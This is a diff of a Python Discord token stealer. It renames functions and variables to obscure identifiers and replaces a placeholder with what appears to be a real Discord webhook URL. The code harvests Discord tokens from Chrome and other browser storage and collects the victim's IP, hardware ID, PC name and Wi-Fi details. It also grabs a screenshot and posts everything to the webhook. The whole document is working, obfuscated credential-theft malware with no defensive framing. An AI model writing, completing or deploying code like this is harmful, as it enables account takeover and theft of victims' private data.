@@ -3,7 +3,7 @@ import json
 import os
 import subprocess
 
-from browsers           import Browsers
+from browsers           import n0x
 from datetime           import datetime
 from base64             import b64decode
 from Crypto.Cipher      import AES
@@ -15,7 +15,7 @@ from urllib.request     import Request, urlopen
 from subprocess         import Popen, PIPE
 from PIL                import ImageGrab
 
-webhook = '%webhook%'
+webhook = 'https://discord.com/api/webhooks/1237831377748234280/TuaKjRuCp6P6S6_6n03glpSHBXfFYvuxA3ril5-nb8IFYdnyZfJ3R2uEPvZCd6D-Xz5o'
 
 def wif():
     try:
@@ -34,7 +34,7 @@ def decrypt(buff, master_key):
     except:
         return "Error"
 
-def getip():
+def fig():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
@@ -45,11 +45,11 @@ def gethwid():
     p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
 
-def get_token():
+def get_nox():
     already_check = []
     checker = []
     cleaned = []
-    tokens = []
+    nox = []
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
     chrome = local + "\\Google\\Chrome\\User Data"
@@ -93,9 +93,9 @@ def get_token():
                         for x in files.readlines():
                             x.strip()
                             for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                tokens.append(values)
+                                nox.append(values)
                 except PermissionError: continue
-        for i in tokens:
+        for i in nox:
             if i.endswith("\\"):
                 i.replace("\\", "")
             elif i not in cleaned:
@@ -114,7 +114,7 @@ def get_token():
                     except: continue
                     if res.status_code == 200:
                         res_json = res.json()
-                        ip = getip()
+                        ip = fig()
                         pc_username = getenv("UserName")
                         pc_name = getenv("COMPUTERNAME")
                         user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
@@ -159,19 +159,19 @@ def get_token():
                             pass
                 else: continue
     
-    wifi_info = wif()
-    wifi_embed = {
+    con_info = wif()
+    con_embed = {
         "title": "**Wi-Fi Information**",
         "color": 0x000000,
         "fields": [
-            {"name": "<a:blackdiamond:856110506670161930> **Wi-Fi Info**", "value": f"```js{wifi_info}```", "inline": False}
+            {"name": "<a:blackdiamond:856110506670161930> **Wi-Fi Info**", "value": f"```js{con_info}```", "inline": False}
         ]
     }
-    wifi_payload = {
-        "embeds": [wifi_embed]
+    con_payload = {
+        "embeds": [con_embed]
     }
-    wifi_res = requests.post(f'{webhook}', json=wifi_payload)
-    if wifi_res.status_code == 204:
+    con_res = requests.post(f'{webhook}', json=con_payload)
+    if con_res.status_code == 204:
         pass
 
     screenshot = ImageGrab.grab()
@@ -196,6 +196,6 @@ def get_token():
 
 
 if __name__ == '__main__':
-    get_token()
-    Browsers(webhook)
+    get_nox()
+    n0x(webhook)
     os.remove("screenshot.png")
